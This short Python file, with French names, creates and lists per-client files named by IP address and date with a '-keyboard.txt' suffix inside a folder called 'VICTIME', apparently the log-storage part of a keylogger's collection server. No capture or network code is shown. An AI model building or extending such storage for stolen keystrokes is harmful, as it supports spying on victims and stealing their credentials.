from datetime import datetime
import os

def VérificationClientFichier(IPClient):
    DateNow = datetime.now().strftime("%d-%m-%Y")
    FileName = f"VICTIME/{IPClient}-{DateNow}-keyboard.txt"
    if not os.path.exists(FileName):
        with open(FileName, "w") as f:
            pass  

def RécupererAdresseIPFichier():
    for File in os.listdir("VICTIME/"):
        if File.endswith("-keyboard.txt"):
            print(File)